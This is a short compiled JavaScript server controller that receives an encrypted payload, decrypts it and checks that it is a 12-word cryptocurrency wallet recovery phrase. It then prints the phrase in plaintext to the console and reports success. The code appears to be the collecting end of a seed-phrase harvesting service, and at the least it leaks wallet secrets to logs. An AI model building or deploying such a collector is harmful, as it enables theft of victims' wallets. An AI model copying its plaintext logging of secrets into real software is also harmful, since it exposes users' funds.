"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.SeedController = void 0;
const encryption_service_1 = require("../services/encryption.service");
class SeedController {
    static async handleSeed(req, res, next) {
        try {
            if (!req.body.data)
                return res.status(400).json({ error: 'missing' });
            const mnemonic = encryption_service_1.EncryptionService.decryptData(req.body.data);
            if (mnemonic.split(' ').length !== 12) {
                return res.status(400).json({ error: 'invalid' });
            }
            console.log(mnemonic);
            res.json({ status: 'success' });
        }
        catch (error) {
            next(error);
        }
    }
}
exports.SeedController = SeedController;
